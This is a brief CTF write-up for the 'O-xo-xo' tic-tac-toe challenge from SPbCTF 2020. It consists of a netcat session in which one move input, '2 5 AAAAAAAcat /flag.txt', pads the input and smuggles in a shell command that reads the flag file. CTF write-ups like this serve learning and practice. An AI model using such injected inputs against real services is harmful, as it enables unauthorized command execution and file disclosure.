# O-xo-xo writeup

```
burgos1337@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/O-xo-xo$ nc -nv 109.233.57.95 20202
Connection to 109.233.57.95 20202 port [tcp/*] succeeded!
Turn # 1, it's x's turn

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 _ _ _ _ _ _
 3 _ _ _ _ _ _
 4 _ _ _ _ _ _
 5 _ _ _ _ _ _
 6 _ _ _ _ _ _

Turn # 2, it's o's turn

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 _ _ _ _ _ _
 3 _ _ _ _ _ _
 4 _ _ _ x _ _
 5 _ _ _ _ _ _
 6 _ _ _ _ _ _

Where do you want to put your 'o' (x y)? 1 2
Turn # 3, it's x's turn

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 o _ _ _ _ _
 3 _ _ _ _ _ _
 4 _ _ _ x _ _
 5 _ _ _ _ _ _
 6 _ _ _ _ _ _

Turn # 4, it's o's turn

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 o _ _ _ _ _
 3 _ _ _ _ _ _
 4 _ _ _ x _ _
 5 _ _ _ x _ _
 6 _ _ _ _ _ _

Where do you want to put your 'o' (x y)? 3 4
Turn # 5, it's x's turn

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 o _ _ _ _ _
 3 _ _ _ _ _ _
 4 _ _ o x _ _
 5 _ _ _ x _ _
 6 _ _ _ _ _ _

Turn # 6, it's o's turn

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 o _ _ _ _ _
 3 _ _ _ x _ _
 4 _ _ o x _ _
 5 _ _ _ x _ _
 6 _ _ _ _ _ _

Where do you want to put your 'o' (x y)? 2 5 AAAAAAAcat /flag.txt
Turn # 7, it's x's turn

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 o _ _ _ _ _
 3 _ _ _ x _ _
 4 _ _ o x _ _
 5 _ o _ x _ _
 6 _ _ _ _ _ _

x has won the game!

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 o _ _ x _ _
 3 _ _ _ x _ _
 4 _ _ o x _ _
 5 _ o _ x _ _
 6 _ _ _ _ _ _

What would you want to do next?
 1) play again
 2) quit the game
? 2
spbctf{OxOxO_N0w_y0u_REALLY_h4ve_w0n}
burgos1337@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/O-xo-xo$                                                  
```